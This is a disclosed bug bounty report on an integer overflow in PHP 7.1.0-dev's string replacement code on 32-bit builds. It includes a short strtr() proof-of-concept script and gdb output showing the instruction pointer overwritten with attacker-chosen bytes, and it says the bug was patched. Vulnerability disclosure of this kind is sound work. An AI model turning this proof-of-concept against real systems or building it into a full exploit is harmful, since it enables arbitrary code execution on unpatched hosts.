# An integer overflow bug in php_str_to_str_ex() led arbitrary code execution.

## Report Details
- **Report ID**: 113122
- **URL**: https://hackerone.com/reports/113122
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-27T22:01:37.826Z
- **Disclosed**: 2019-11-12T09:37:53.176Z

## Reporter
- **Username**: blue9057
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Description
------------------

An integer overflow vulnerability exists in PHP-7.1.0
due to missing check of size before calling
zend_string_alloc() in ext/standard/string.c:3234.

Code:
new_str = zend_string_alloc(count * (str_len - needle_len) + ZSTR_LEN(haystack), 0);

All variables including str_len, needle_len, count, haystack are fully controllable.
The overflow results as arbitrary code execution,
as running of test script alter %eip to the arbitrary values.

This bug is only triggered in 32bit machine.

Test script
-------------------
<?php
   $a = str_repeat('A', 65536);
   $b = str_repeat('ABCD', 32768);
   // Changing 'ABCD' into other value alters %eip to arbitrary value.
   $c = array('AA'=> $b);
   strtr($a , $c);
?>

Expected result
------------------------
Correct execution of strtr() function.

Actual result
--------------------
[blue9057@ubuntu ~/exploit/php$] gdb `which php`
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/local/bin/php...done.
(gdb) r strtr.php
Starting program: /usr/local/bin/php strtr.php

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xb7a75000	-1213771776
edx            0xb7a130f0	-1214172944
ebx            0x1	1
esp            0xbfffc01c	0xbfffc01c
ebp            0xbfffc0b4	0xbfffc0b4
esi            0xb7a13020	-1214173152
edi            0xb7a741c0	-1213775424
eip            0x44434241	0x44434241
eflags         0x10286	[ PF SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r -v
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/php -v
PHP 7.1.0-dev (cli) (built: Jan 24 2016 20:39:41) ( NTS )
Copyright (c) 1997-2016 The PHP Group
Zend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies
[Inferior 1 (process 4169) exited normally]

EIP is controlled as 0x44434241 with the PoC code placed above, from the input "ABCD".
The attacker can jmp to arbitrary address by controlling that value.


The bug is reported to PHP, and patched & closed; reference is here:
https://bugs.php.net/bug.php?id=71450


## Attachments
No attachments
